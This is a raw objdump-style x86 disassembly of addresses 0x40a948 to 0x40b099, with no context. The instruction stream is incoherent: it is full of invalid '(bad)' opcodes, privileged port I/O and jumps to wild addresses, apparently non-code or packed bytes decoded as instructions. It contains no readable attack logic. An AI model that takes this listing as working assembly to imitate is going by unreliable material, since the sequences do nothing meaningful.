  40a948:	jnp    0x40a98f
  40a94a:	or     dh,al
  40a94c:	jns    0x40a9b6
  40a94e:	arpl   WORD PTR [ebx+0x3],dx
  40a951:	popf   
  40a952:	outs   dx,DWORD PTR ds:[esi]
  40a953:	or     eax,0xc5403acf
  40a958:	add    DWORD PTR [esp+esi*2-0x64],edx
  40a95c:	mov    edi,0xcefc7d3d
  40a961:	stc    
  40a962:	(bad)  
  40a963:	xor    dl,BYTE PTR [esp]
  40a966:	jae    0x40a9d9
  40a968:	and    BYTE PTR [ecx-0x78],bl
  40a96b:	scas   eax,DWORD PTR es:[edi]
  40a96c:	fcmovne st,st(1)
  40a96e:	pop    es
  40a96f:	das    
  40a970:	or     al,0xc0
  40a972:	pop    ecx
  40a973:	sar    BYTE PTR [ebx-0x1f],cl
  40a976:	or     BYTE PTR [ecx+ecx*1],ch
  40a979:	stc    
  40a97a:	dec    edx
  40a97b:	mov    cl,0x7b
  40a97d:	test   BYTE PTR [ebx-0x62c358a6],dl
  40a983:	cmp    ecx,DWORD PTR [ebx-0x24]
  40a986:	cmp    esi,esp
  40a988:	xchg   DWORD PTR [edx+0x65],ebx
  40a98b:	ins    BYTE PTR es:[edi],dx
  40a98c:	mov    fs,WORD PTR [edx]
  40a98e:	push   es
  40a98f:	mov    ds:0xb0d838f7,eax
  40a994:	ds dec ebp
  40a996:	fwait
  40a997:	pusha  
  40a998:	fisttp WORD PTR [edi-0x5dd92243]
  40a99e:	out    dx,eax
  40a99f:	dec    esp
  40a9a0:	inc    edx
  40a9a1:	call   0xdfb1120d
  40a9a6:	hlt    
  40a9a7:	inc    ebx
  40a9a8:	aaa    
  40a9a9:	xchg   DWORD PTR [ebp-0x6a8a4359],edi
  40a9af:	cmp    DWORD PTR [esi-0x1e],esp
  40a9b2:	mov    bl,0x71
  40a9b4:	ret    0xbfc7
  40a9b7:	daa    
  40a9b8:	pop    ds
  40a9b9:	retf   
  40a9ba:	nop
  40a9bb:	push   edi
  40a9bc:	std    
  40a9bd:	xchg   esp,eax
  40a9bf:	fisttp WORD PTR [ebx-0x56394782]
  40a9c5:	pop    eax
  40a9c6:	leave  
  40a9c7:	dec    edi
  40a9c8:	lods   al,BYTE PTR es:[esi]
  40a9ca:	jns    0x40a982
  40a9cc:	and    esp,DWORD PTR [eax-0x4a]
  40a9cf:	xor    eax,0xda76e56f
  40a9d4:	loope  0x40a99a
  40a9d6:	push   0xec03dee4
  40a9db:	cs int3 
  40a9dd:	sbb    BYTE PTR ds:0x59aa583f,0x93
  40a9e4:	dec    ecx
  40a9e5:	popa   
  40a9e6:	cmp    ebp,0x93decb2
  40a9ec:	mov    al,0xab
  40a9ee:	pop    DWORD PTR [edi+edi*1-0x5e]
  40a9f2:	jge    0x40aa51
  40a9f4:	inc    ebx
  40a9f5:	les    esi,FWORD PTR [ebx]
  40a9f7:	adc    dh,BYTE PTR [esi+0x50]
  40a9fa:	fild   WORD PTR [eax+0x10]
  40a9fd:	lea    edi,[edi]
  40a9ff:	retf   
  40aa00:	push   ecx
  40aa01:	push   ecx
  40aa02:	mov    ah,0xa
  40aa04:	jge    0x40a9aa
  40aa06:	imul   eax,DWORD PTR [ebx-0x6339027f],0x56ea5a21
  40aa10:	sbb    dl,bh
  40aa12:	or     eax,0xeaae713
  40aa17:	ins    DWORD PTR es:[edi],dx
  40aa18:	sbb    dh,BYTE PTR [edi-0x75dc30]
  40aa1e:	jmp    0x6485fe3c
  40aa23:	inc    edx
  40aa24:	ins    BYTE PTR es:[edi],dx
  40aa25:	dec    esp
  40aa26:	xchg   ebx,eax
  40aa27:	jecxz  0x40a9b7
  40aa29:	aad    0x1f
  40aa2b:	aaa    
  40aa2c:	pushf  
  40aa2d:	push   ebx
  40aa2e:	mov    bh,BYTE PTR [edi]
  40aa30:	(bad)  
  40aa31:	push   ecx
  40aa32:	push   es
  40aa33:	mov    eax,ds:0x1e479a71
  40aa38:	pop    esi
  40aa39:	imul   ebp,DWORD PTR [ecx-0x23],0xffffff9b
  40aa3d:	mov    ebx,0x2fa1c682
  40aa42:	ror    BYTE PTR [edi+0x3d],0xc8
  40aa46:	mov    ah,0x67
  40aa48:	push   es
  40aa49:	pusha  
  40aa4a:	icebp  
  40aa4b:	loopne 0x40aa32
  40aa4d:	ins    BYTE PTR es:[edi],dx
  40aa4e:	sbb    esi,DWORD PTR [edi-0x6ecdda6d]
  40aa54:	jl     0x40aa65
  40aa56:	sub    DWORD PTR [esi-0x76f743b],0xcf9a7da0
  40aa60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa61:	inc    esp
  40aa62:	out    dx,eax
  40aa63:	cmp    edi,DWORD PTR [ebp-0x4a]
  40aa66:	xor    ax,0x4c86
  40aa6a:	push   edx
  40aa6b:	bound  ebp,QWORD PTR [esi]
  40aa6d:	xor    BYTE PTR [esi-0x2b537dc6],al
  40aa73:	or     ebp,ecx
  40aa75:	dec    esp
  40aa76:	hlt    
  40aa77:	stos   BYTE PTR es:[edi],al
  40aa78:	out    dx,al
  40aa79:	add    cl,BYTE PTR [esi+0xeef563d]
  40aa7f:	retf   0xa1f7
  40aa82:	(bad)  [edi]
  40aa84:	fstp   st(4)
  40aa86:	lea    ebx,[ebp-0x586525bd]
  40aa8c:	jg     0x40ab06
  40aa8e:	add    eax,0xd30ae495
  40aa93:	or     DWORD PTR [eax],ebp
  40aa95:	sub    al,0x8f
  40aa97:	fst    DWORD PTR [ecx]
  40aa99:	loop   0x40aa9f
  40aa9b:	jbe    0x40aa4c
  40aa9d:	push   ebx
  40aa9e:	aad    0x53
  40aaa0:	adc    eax,0x20efa86e
  40aaa5:	es inc ecx
  40aaa7:	ins    BYTE PTR es:[edi],dx
  40aaa8:	mov    DWORD PTR [esp+edx*8+0x74],edi
  40aaac:	jae    0x40aa7f
  40aaae:	xchg   DWORD PTR [ecx+ecx*8-0x71],edx
  40aab2:	sub    eax,0xb1f5fea7
  40aab7:	mov    ds:0xe416f793,eax
  40aabc:	out    dx,eax
  40aabd:	retf   0x6825
  40aac0:	xchg   esp,eax
  40aac1:	je     0x40aa69
  40aac3:	mov    edx,edx
  40aac5:	push   es
  40aac6:	aaa    
  40aac7:	mov    al,0x95
  40aac9:	jl     0x40aac8
  40aacb:	js     0x40aac6
  40aacd:	in     eax,dx
  40aace:	pop    edx
  40aacf:	stos   BYTE PTR es:[edi],al
  40aad0:	lds    esp,FWORD PTR [eax]
  40aad2:	in     al,0x18
  40aad4:	in     eax,dx
  40aad5:	stos   DWORD PTR es:[edi],eax
  40aad6:	and    al,0x4a
  40aad8:	ds popf 
  40aada:	scas   al,BYTE PTR es:[edi]
  40aadb:	cmp    al,ch
  40aadd:	mov    ebp,0x601bdf25
  40aae2:	ds pop ecx
  40aae4:	int    0xf0
  40aae6:	fbld   TBYTE PTR [ecx]
  40aae8:	xchg   esi,eax
  40aae9:	loop   0x40ab16
  40aaeb:	xor    ecx,edx
  40aaed:	fisttp DWORD PTR [ebx-0x6d]
  40aaf0:	sbb    eax,0x4ddd2a6d
  40aaf5:	cmc    
  40aaf6:	mov    dh,0xff
  40aaf8:	adc    ch,BYTE PTR [edi+0x17]
  40aafb:	aas    
  40aafc:	xor    DWORD PTR [ecx+0x65],0x996c356e
  40ab03:	mov    ebp,0xfe13c253
  40ab08:	retf   
  40ab09:	mov    ch,0x43
  40ab0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab0c:	push   esp
  40ab0d:	data16 (bad) 
  40ab0f:	vunpckhps ymm2,ymm6,YMMWORD PTR [eax+0x40]
  40ab14:	dec    esp
  40ab15:	pop    ecx
  40ab16:	popf   
  40ab17:	stos   BYTE PTR es:[edi],al
  40ab18:	idiv   edi
  40ab1a:	out    dx,al
  40ab1b:	(bad)  
  40ab1d:	push   edx
  40ab1e:	ins    BYTE PTR es:[edi],dx
  40ab1f:	ja     0x40ab5f
  40ab21:	in     al,dx
  40ab22:	retf   
  40ab23:	pop    ebp
  40ab24:	cs and eax,0x4045729f
  40ab2a:	fadd   st(5),st
  40ab2c:	mov    eax,0x5e9739f8
  40ab31:	mov    edi,0x8a8f69d0
  40ab36:	xchg   esp,eax
  40ab37:	ss dec ebp
  40ab39:	pop    ebx
  40ab3a:	jmp    FWORD PTR [ebx]
  40ab3c:	pop    ebp
  40ab3d:	test   ch,bh
  40ab3f:	or     ah,0x18
  40ab42:	dec    esp
  40ab43:	outs   dx,DWORD PTR ds:[esi]
  40ab44:	test   BYTE PTR [eax],ch
  40ab46:	jg     0x40ab9e
  40ab48:	adc    BYTE PTR [eax+0x71933a98],dh
  40ab4e:	and    DWORD PTR [edx+edx*8-0x591866e3],ebx
  40ab55:	out    0x6e,eax
  40ab57:	pop    ebx
  40ab58:	daa    
  40ab59:	or     eax,0x96875ac9
  40ab5e:	retf   0x7034
  40ab61:	test   eax,0x7433d18c
  40ab66:	das    
  40ab67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab68:	pop    esp
  40ab69:	jns    0x40abe2
  40ab6b:	dec    ecx
  40ab6c:	retf   0xc99
  40ab6f:	ja     0x40abda
  40ab71:	or     cl,0x3d
  40ab74:	pop    esp
  40ab75:	adc    eax,0xe0acb85c
  40ab7a:	das    
  40ab7b:	loop   0x40ab3e
  40ab7d:	test   al,0xe7
  40ab7f:	mov    dh,0x3
  40ab81:	dec    eax
  40ab82:	mov    DWORD PTR [edx+0x309f1720],edi
  40ab88:	pop    ss
  40ab89:	mov    dh,0xbf
  40ab8b:	es dec esp
  40ab8d:	cmp    eax,0x986f499d
  40ab92:	iret   
  40ab93:	inc    edx
  40ab94:	test   al,0xa
  40ab96:	fcomp  QWORD PTR [esi-0x59]
  40ab99:	lds    edx,FWORD PTR [ebx+0x691a8e2e]
  40ab9f:	mov    edx,0xe11e107d
  40aba4:	pop    es
  40aba5:	jg     0x40abad
  40aba7:	addr16 xchg ebx,eax
  40aba9:	out    0x63,al
  40abab:	pop    ebx
  40abac:	lds    ecx,FWORD PTR [edi+0x2f]
  40abaf:	hlt    
  40abb0:	and    esi,ecx
  40abb2:	in     eax,dx
  40abb3:	xor    BYTE PTR [ebx-0x13774615],bh
  40abb9:	int    0x59
  40abbb:	xor    BYTE PTR [ebx],0xd3
  40abbe:	mov    cl,0xbc
  40abc0:	les    eax,FWORD PTR [ebp+0x65d50a9]
  40abc6:	dec    esp
  40abc7:	dec    edx
  40abc8:	inc    esi
  40abc9:	js     0x40abd4
  40abcb:	fincstp 
  40abcd:	xor    al,0x88
  40abcf:	(bad)  
  40abd1:	cdq    
  40abd2:	or     DWORD PTR [ebx],esi
  40abd4:	out    dx,al
  40abd5:	push   esp
  40abd6:	test   eax,0x42f2f30e
  40abdb:	in     al,0x76
  40abdd:	adc    DWORD PTR gs:[edi-0x52],esi
  40abe1:	xchg   esp,eax
  40abe2:	ins    DWORD PTR es:[edi],dx
  40abe3:	imul   DWORD PTR [eax-0x16275660]
  40abe9:	lock mov dh,0x4b
  40abec:	bnd jp 0x40abcb
  40abef:	leave  
  40abf0:	push   eax
  40abf1:	repz adc dl,BYTE PTR [edi]
  40abf4:	jnp    0x40abf0
  40abf6:	jo     0x40ac4c
  40abf8:	mov    edi,DWORD PTR [ecx]
  40abfa:	xor    eax,0x29fc7ebe
  40abff:	loop   0x40ac2d
  40ac01:	aad    0xfb
  40ac03:	popa   
  40ac04:	stc    
  40ac05:	in     al,dx
  40ac06:	push   ecx
  40ac07:	xor    esi,DWORD PTR [ebx-0x50]
  40ac0a:	mov    edi,0x8d8f3870
  40ac0f:	cmp    eax,0xd5d68b67
  40ac14:	jge    0x40ac64
  40ac16:	shl    DWORD PTR [esi],0x5d
  40ac19:	sbb    ah,0x0
  40ac1c:	push   eax
  40ac1d:	imul   eax,DWORD PTR [ecx+ebx*1+0xe2059f0],0x76
  40ac25:	fnstenv [esi-0x3b]
  40ac28:	push   ss
  40ac29:	test   eax,0xc925fa83
  40ac2e:	out    dx,al
  40ac2f:	cmp    BYTE PTR [ecx+0x7f],al
  40ac32:	mov    al,0x37
  40ac34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac35:	jmp    0x94aa86b7
  40ac3a:	iret   
  40ac3b:	and    DWORD PTR [ebx],esp
  40ac3d:	mov    WORD PTR [ecx],ds
  40ac3f:	in     eax,0x6f
  40ac41:	lea    ecx,[ebx-0x45fea408]
  40ac47:	fdivr  st(4),st
  40ac49:	ficomp WORD PTR [edi-0x77bbf8f8]
  40ac4f:	mov    ds:0x35fe6fc9,eax
  40ac54:	cmp    al,0xea
  40ac56:	xor    DWORD PTR [eax+eax*4],0x7b
  40ac5a:	push   cs
  40ac5b:	cs inc ecx
  40ac5d:	sbb    BYTE PTR [edi-0x29],0x33
  40ac61:	mov    eax,ds:0x25bba693
  40ac66:	push   sp
  40ac68:	or     al,0x2f
  40ac6a:	push   ebx
  40ac6b:	lds    edi,FWORD PTR [eax]
  40ac6d:	repnz mov ebp,0xc815f391
  40ac73:	test   al,0x10
  40ac75:	or     DWORD PTR [esi-0x79],ebp
  40ac78:	fldcw  WORD PTR [eax+0x5ffc7a59]
  40ac7e:	xchg   esp,eax
  40ac7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac80:	inc    ebx
  40ac81:	xchg   ebx,eax
  40ac82:	and    al,0xe4
  40ac84:	inc    eax
  40ac85:	cmovae edi,DWORD PTR [esi-0x50]
  40ac89:	pusha  
  40ac8a:	arpl   WORD PTR [ebx-0x8],cx
  40ac8d:	daa    
  40ac8e:	lock imul BYTE PTR [eax-0x51]
  40ac92:	(bad)  
  40ac93:	sbb    ecx,ebp
  40ac95:	and    BYTE PTR [eax],dh
  40ac97:	popf   
  40ac98:	jl     0x40ac7c
  40ac9a:	add    ebx,DWORD PTR [eax]
  40ac9c:	neg    bh
  40ac9e:	sub    eax,0x4debfa15
  40aca3:	into   
  40aca4:	test   al,0xa1
  40aca6:	(bad)  
  40aca7:	xlat   BYTE PTR ds:[ebx]
  40aca8:	cmp    al,0x98
  40acaa:	test   esp,ebp
  40acac:	cmp    eax,0xac354c6d
  40acb1:	enter  0x382b,0x1e
  40acb5:	pop    esp
  40acb6:	test   al,0x14
  40acb8:	xchg   ebp,eax
  40acb9:	push   ds
  40acba:	mov    WORD PTR [eax-0x43],?
  40acbd:	mov    dl,0xc3
  40acbf:	jg     0x40ac51
  40acc1:	dec    edi
  40acc2:	shr    DWORD PTR [ecx+0x45],1
  40acc5:	pop    ecx
  40acc6:	and    al,0xa3
  40acc8:	imul   BYTE PTR [ebx+edi*4-0x37861a6b]
  40accf:	ss push esp
  40acd1:	test   DWORD PTR [ebx],0x5c46580
  40acd7:	popa   
  40acd8:	fld    DWORD PTR [ebx+0x1d]
  40acdb:	dec    cl
  40acdd:	xlat   BYTE PTR ds:[ebx]
  40acde:	fdivr  DWORD PTR [ebp-0x46]
  40ace1:	call   0x5444:0x84288b5b
  40ace8:	mov    DWORD PTR [eax-0x36ce5d1b],eax
  40acee:	or     bh,BYTE PTR [edx+esi*2-0x7f169ed3]
  40acf5:	xchg   edx,eax
  40acf6:	xor    BYTE PTR [ecx],bl
  40acf8:	ror    BYTE PTR [eax+0x3ac10976],0x6b
  40acff:	aaa    
  40ad00:	push   edx
  40ad01:	lahf   
  40ad02:	or     BYTE PTR [edx+0x636a09c8],0x18
  40ad09:	sub    BYTE PTR [edx+0x261c0139],bl
  40ad0f:	sub    eax,0xe3804f80
  40ad14:	loopne 0x40ad30
  40ad16:	push   eax
  40ad17:	dec    esp
  40ad18:	xlat   BYTE PTR ds:[ebx]
  40ad19:	je     0x40ad87
  40ad1b:	or     dh,ah
  40ad1d:	in     eax,dx
  40ad1e:	cmp    edx,edx
  40ad20:	xor    al,0x80
  40ad22:	push   ebx
  40ad23:	lea    ebp,[esi-0x54]
  40ad26:	jno    0x40acab
  40ad28:	rol    BYTE PTR [ebp+0x36],1
  40ad2b:	sub    bh,dl
  40ad2d:	fwait
  40ad2e:	call   DWORD PTR [ebx]
  40ad30:	jmp    0x79ff:0x6822
  40ad36:	pop    ebp
  40ad37:	out    dx,eax
  40ad38:	ret    
  40ad39:	or     BYTE PTR [ecx+eax*2-0x7b932738],al
  40ad40:	dec    ebx
  40ad41:	sti    
  40ad42:	adc    esi,ecx
  40ad44:	jecxz  0x40ad55
  40ad46:	in     al,0x31
  40ad48:	xchg   esi,eax
  40ad49:	pushw  0x3bf9
  40ad4d:	enter  0x8164,0x36
  40ad51:	stos   BYTE PTR es:[edi],al
  40ad52:	stc    
  40ad53:	fcmove st,st(0)
  40ad55:	out    0xeb,eax
  40ad57:	dec    ecx
  40ad58:	pusha  
  40ad59:	out    0xa7,eax
  40ad5b:	sub    dl,BYTE PTR [eax+eiz*1+0x51]
  40ad5f:	imul   edi,DWORD PTR [edx-0x42],0x9974156f
  40ad66:	loopne 0x40ad7b
  40ad68:	adc    al,0x33
  40ad6a:	cmp    ecx,DWORD PTR [edi-0x28221736]
  40ad70:	sub    BYTE PTR [eax],ch
  40ad72:	dec    edi
  40ad73:	xchg   edx,eax
  40ad74:	pop    ds
  40ad75:	loope  0x40ad1c
  40ad77:	push   0x4f
  40ad79:	aas    
  40ad7a:	mov    eax,0x3f3c69b
  40ad7f:	imul   ecx,DWORD PTR [ebx+0x2],0xffffffbb
  40ad83:	js     0x40ada9
  40ad85:	scas   al,BYTE PTR es:[edi]
  40ad86:	test   eax,0x2f20b210
  40ad8b:	je     0x40adc9
  40ad8d:	pop    edi
  40ad8e:	pop    esi
  40ad8f:	ja     0x40ad22
  40ad91:	add    BYTE PTR [edx+0x7f],ah
  40ad94:	ins    DWORD PTR es:[edi],dx
  40ad95:	inc    esp
  40ad96:	or     edx,ecx
  40ad98:	dec    eax
  40ad99:	loopne 0x40ad99
  40ad9b:	jp     0x40adb7
  40ad9d:	call   FWORD PTR [edx]
  40ad9f:	sbb    eax,0x12fd554f
  40ada4:	or     BYTE PTR [eax],dh
  40ada6:	leave  
  40ada7:	aas    
  40ada8:	icebp  
  40ada9:	sub    esi,DWORD PTR [ecx+0x53185f43]
  40adaf:	mov    ds:0xcc50252,al
  40adb4:	sahf   
  40adb5:	clc    
  40adb6:	mov    ah,0x39
  40adb8:	sti    
  40adb9:	out    0x67,eax
  40adbb:	jl     0x40ad6f
  40adbd:	jne    0x40ae1c
  40adbf:	in     al,dx
  40adc0:	dec    eax
  40adc1:	xchg   edx,eax
  40adc2:	xchg   edx,eax
  40adc3:	aaa    
  40adc4:	cmp    ah,BYTE PTR [edx+edx*1]
  40adc7:	retf   0xcc8b
  40adca:	popf   
  40adcb:	or     cl,ch
  40adcd:	iret   
  40adce:	stos   DWORD PTR es:[edi],eax
  40adcf:	dec    ebx
  40add0:	xchg   ebx,eax
  40add1:	adc    eax,0x84d09113
  40add6:	dec    DWORD PTR [edi]
  40add8:	cmp    BYTE PTR [esp+edx*8+0x42],0xda
  40addd:	mov    BYTE PTR [ebx],cl
  40addf:	jge    0x40ae2e
  40ade1:	jge    0x40ade3
  40ade3:	int    0xa6
  40ade5:	jb     0x40adaf
  40ade7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ade8:	cs add bh,al
  40adeb:	push   edx
  40adec:	sbb    ebx,DWORD PTR [ebx+0x55]
  40adef:	stos   BYTE PTR es:[edi],al
  40adf0:	in     eax,dx
  40adf1:	cmp    DWORD PTR [ebp+0x5c72adb4],0xffffff82
  40adf8:	shld   DWORD PTR [edi-0x5117965a],edi,cl
  40adff:	test   DWORD PTR [ecx+edx*8+0x7b],eax
  40ae03:	adc    edx,DWORD PTR [eax+0x48]
  40ae06:	sbb    eax,0x6bda674e
  40ae0b:	pop    ebp
  40ae0c:	(bad)  
  40ae0d:	push   ecx
  40ae0e:	ror    BYTE PTR [esi+0x41],0xf4
  40ae12:	mov    cs,WORD PTR [ebp+0x34376714]
  40ae18:	xadd   BYTE PTR [esi-0xd],ch
  40ae1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae1d:	inc    esp
  40ae1e:	rcr    bh,1
  40ae20:	jmp    0x3efee3f9
  40ae25:	push   edi
  40ae26:	sbb    DWORD PTR [esi-0x9],ebp
  40ae29:	in     al,dx
  40ae2a:	icebp  
  40ae2b:	fcomip st,st(6)
  40ae2d:	push   ecx
  40ae2e:	cwde   
  40ae2f:	dec    esp
  40ae30:	out    0x7a,eax
  40ae32:	or     edx,DWORD PTR [ebx+ecx*8-0x392c4ed9]
  40ae39:	loope  0x40ae91
  40ae3b:	ds pop edi
  40ae3d:	sub    ecx,edi
  40ae3f:	cmp    eax,0xba46c747
  40ae44:	loope  0x40ae03
  40ae46:	push   DWORD PTR [edx]
  40ae48:	and    al,0x93
  40ae4a:	push   ecx
  40ae4b:	sub    al,0x7
  40ae4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae4e:	cmp    eax,0xff2365d1
  40ae53:	mov    ebx,0xe238f412
  40ae58:	ins    DWORD PTR es:[edi],dx
  40ae59:	test   DWORD PTR [ebp-0x29469cbf],esi
  40ae5f:	dec    ebp
  40ae60:	clc    
  40ae61:	es call 0x90c1:0x48453292
  40ae69:	jae    0x40aec2
  40ae6b:	loope  0x40ae37
  40ae6d:	std    
  40ae6e:	int3   
  40ae6f:	and    ecx,ecx
  40ae71:	pop    ss
  40ae72:	pop    es
  40ae73:	and    DWORD PTR [eax],ebx
  40ae75:	aaa    
  40ae76:	retf   0x5571
  40ae79:	jge    0x40ae98
  40ae7b:	push   edi
  40ae7c:	fsub   DWORD PTR [edx-0x7a77aecf]
  40ae82:	rol    BYTE PTR [ebx-0x6c],1
  40ae85:	xchg   ebx,ebx
  40ae87:	push   ecx
  40ae88:	sbb    al,0x36
  40ae8a:	xchg   edx,eax
  40ae8b:	add    eax,0xa4940ea3
  40ae90:	mov    ds:0x74aaf0c4,al
  40ae95:	loopne 0x40aecd
  40ae97:	push   0xffffffe7
  40ae99:	lahf   
  40ae9a:	std    
  40ae9b:	aaa    
  40ae9c:	sbb    al,0x5c
  40ae9e:	jmp    0xab9a:0xe38fbe3a
  40aea5:	sub    DWORD PTR [edx],edx
  40aea7:	outs   dx,DWORD PTR ds:[esi]
  40aea8:	pop    ds
  40aea9:	fmul   QWORD PTR [eax-0x5b]
  40aeac:	add    ch,ah
  40aeae:	fcom   QWORD PTR [edx-0x56cf4e89]
  40aeb4:	(bad)  
  40aeb5:	cmp    esi,DWORD PTR [ebx]
  40aeb7:	dec    edx
  40aeb8:	xchg   ecx,eax
  40aeb9:	pop    esi
  40aeba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aebb:	cmp    al,BYTE PTR [edi]
  40aebd:	aad    0x2a
  40aebf:	ins    DWORD PTR es:[edi],dx
  40aec0:	add    esp,ebp
  40aec2:	mov    edx,0xdb11005a
  40aec7:	sub    edi,ebx
  40aec9:	pop    edi
  40aeca:	and    ebx,ebp
  40aecc:	jmp    0xbe146001
  40aed1:	or     BYTE PTR [ebx-0x5a],ch
  40aed4:	xchg   DWORD PTR [eax-0x1e],eax
  40aed7:	out    0x5f,al
  40aed9:	ins    DWORD PTR es:[edi],dx
  40aeda:	idiv   DWORD PTR [edx+0x47]
  40aedd:	clc    
  40aede:	or     esi,DWORD PTR ds:0xbd45437e
  40aee4:	sub    eax,0x85c9230
  40aee9:	dec    eax
  40aeea:	mov    al,ds:0xb04ef6a9
  40aeef:	das    
  40aef0:	and    eax,0x9bc79498
  40aef5:	push   edi
  40aef6:	jmp    0xaa27763c
  40aefb:	data16 test BYTE PTR [edi+0x13],bl
  40aeff:	sahf   
  40af00:	lahf   
  40af01:	jne    0x40af48
  40af03:	lea    ebx,[edi+0x6]
  40af06:	mov    ds,WORD PTR [ebp+0xcc6fd3f]
  40af0c:	pop    edx
  40af0d:	lds    edi,FWORD PTR [edi+0x3a9091d1]
  40af13:	sbb    al,0x94
  40af15:	and    ecx,ecx
  40af17:	in     al,0xe5
  40af19:	fldcw  WORD PTR [ebp-0x13]
  40af1c:	or     eax,0xe73329ee
  40af21:	and    bl,BYTE PTR [edx-0x29ca102d]
  40af27:	mov    ebx,?
  40af29:	push   eax
  40af2a:	scas   al,BYTE PTR es:[edi]
  40af2b:	clc    
  40af2c:	cmp    BYTE PTR ds:0x72e647a5,dl
  40af32:	jl     0x40af84
  40af34:	add    al,0x14
  40af36:	aam    0xbe
  40af38:	push   0x3ac94218
  40af3d:	in     al,0xc3
  40af3f:	sub    BYTE PTR [esi+ecx*1],0x39
  40af43:	les    ebx,FWORD PTR [edi]
  40af45:	ds clc 
  40af47:	mov    ecx,ds
  40af49:	or     ah,bh
  40af4b:	or     bh,al
  40af4d:	xchg   esp,eax
  40af4e:	je     0x40afa3
  40af50:	xchg   BYTE PTR [eax+0x6e33ae9e],ah
  40af56:	fnstenv [ebx]
  40af58:	jg     0x40af1f
  40af5a:	or     ch,BYTE PTR [ebx-0x7121e6f3]
  40af60:	cmp    eax,0xffffffdd
  40af63:	add    ah,dh
  40af65:	adc    al,0x2b
  40af67:	xchg   ecx,eax
  40af68:	test   DWORD PTR [edx-0x5cae27b3],edi
  40af6e:	pop    esp
  40af6f:	sbb    al,0xb9
  40af71:	daa    
  40af72:	int3   
  40af73:	(bad)  
  40af74:	lods   eax,DWORD PTR ds:[esi]
  40af75:	addr16 push ebp
  40af77:	mov    edx,0x750ec425
  40af7c:	push   edi
  40af7d:	data16 lock out dx,al
  40af80:	(bad)  
  40af81:	mov    ecx,0x65f64d80
  40af86:	mov    eax,0x1a2c474d
  40af8b:	sar    DWORD PTR [ebx+eiz*8],0x3f
  40af8f:	and    eax,0xe24e2133
  40af94:	push   es
  40af95:	test   DWORD PTR [eax+0x65],0x6db4f398
  40af9c:	mov    es,WORD PTR [ecx]
  40af9e:	pop    es
  40af9f:	jge    0x40af2c
  40afa1:	and    DWORD PTR [ecx+0x5c],esp
  40afa4:	iret   
  40afa5:	jp     0x40af86
  40afa7:	mov    BYTE PTR [ebp+ecx*2+0x2ad861a0],al
  40afae:	sub    edx,DWORD PTR [edx-0x38]
  40afb1:	sbb    eax,0x2683b8b8
  40afb6:	pop    edi
  40afb7:	stos   DWORD PTR es:[edi],eax
  40afb8:	ja     0x40afce
  40afba:	jbe    0x40afd8
  40afbc:	xor    dh,al
  40afbe:	imul   eax,DWORD PTR [ebx-0x54],0x5e6d3ca7
  40afc5:	rcl    BYTE PTR [edi],0x2e
  40afc8:	scas   eax,DWORD PTR es:[edi]
  40afc9:	retf   0xa3fe
  40afcc:	mov    ds:0x1e5aa744,eax
  40afd1:	je     0x40aff5
  40afd3:	pop    es
  40afd4:	mov    DWORD PTR [ebp+0x7c],esp
  40afd7:	sti    
  40afd8:	retf   0xc9ac
  40afdb:	imul   edx,ebp,0x29
  40afde:	lea    esi,[esi-0x1c36fa80]
  40afe4:	sbb    cl,dh
  40afe6:	ss aas 
  40afe8:	cmp    BYTE PTR [ebx+0x27],ch
  40afeb:	pop    ebx
  40afec:	imul   esp,DWORD PTR [edx+0x3cd979b9],0xa60154fb
  40aff6:	imul   edx,DWORD PTR ds:0xeb32d177,0xfffffffb
  40affd:	mov    edi,0x641ba352
  40b002:	arpl   WORD PTR [ecx],si
  40b004:	sub    ah,bl
  40b006:	mov    edi,0xfd030a92
  40b00b:	or     al,0x5c
  40b00d:	pop    esp
  40b00e:	sub    cl,0x7
  40b011:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b012:	arpl   ax,sp
  40b014:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b015:	xchg   ebp,eax
  40b016:	out    dx,eax
  40b017:	mov    WORD PTR [ebx+0x65],cs
  40b01a:	sbb    esi,edi
  40b01c:	pop    ss
  40b01d:	imul   esi,DWORD PTR [esi+eiz*4+0x58],0x2564fff7
  40b025:	mov    ds:0x46fccff7,al
  40b02b:	jp     0x40b09c
  40b02d:	add    eax,0x55de2fe4
  40b032:	jb     0x40b049
  40b034:	inc    esi
  40b035:	test   BYTE PTR [esi+0x3b],0xf6
  40b039:	test   eax,0x2887b949
  40b03e:	cs adc eax,0x9eab239c
  40b044:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b045:	fs lahf 
  40b047:	xchg   ecx,eax
  40b048:	outs   dx,DWORD PTR ds:[esi]
  40b049:	rcl    ch,cl
  40b04b:	push   ecx
  40b04c:	loopne 0x40b0cb
  40b04e:	push   ecx
  40b04f:	inc    ebx
  40b050:	arpl   WORD PTR [eax-0x10],dx
  40b053:	jne    0x40b090
  40b055:	lods   al,BYTE PTR ds:[esi]
  40b056:	sub    ebx,DWORD PTR [ebx]
  40b058:	cld    
  40b059:	push   edx
  40b05a:	arpl   WORD PTR [ecx+ebx*1],si
  40b05d:	dec    edi
  40b05e:	xchg   ecx,eax
  40b05f:	xchg   BYTE PTR [edi-0xe54920a],bl
  40b065:	xor    al,dl
  40b067:	cli    
  40b068:	out    0x70,al
  40b06a:	sbb    ecx,ecx
  40b06c:	div    ah
  40b06e:	(bad)  
  40b06f:	pop    ecx
  40b070:	repnz sub al,0x33
  40b073:	fisttp WORD PTR [ecx]
  40b075:	mov    ebx,0xd3e6fe6
  40b07a:	jmp    0x44a425c9
  40b07f:	push   edi
  40b080:	push   0x61c8beab
  40b085:	cdq    
  40b086:	sub    BYTE PTR [edi+0x5d],0xa9
  40b08a:	pushf  
  40b08b:	pop    ss
  40b08c:	arpl   bp,bp
  40b08e:	mov    al,0xf7
  40b090:	xchg   ebx,eax
  40b091:	or     al,BYTE PTR [edi]
  40b093:	retf   0x8faa
  40b096:	adc    al,0x32
  40b098:	std    
  40b099:	test   BYTE PTR [eax+esi*8],dh
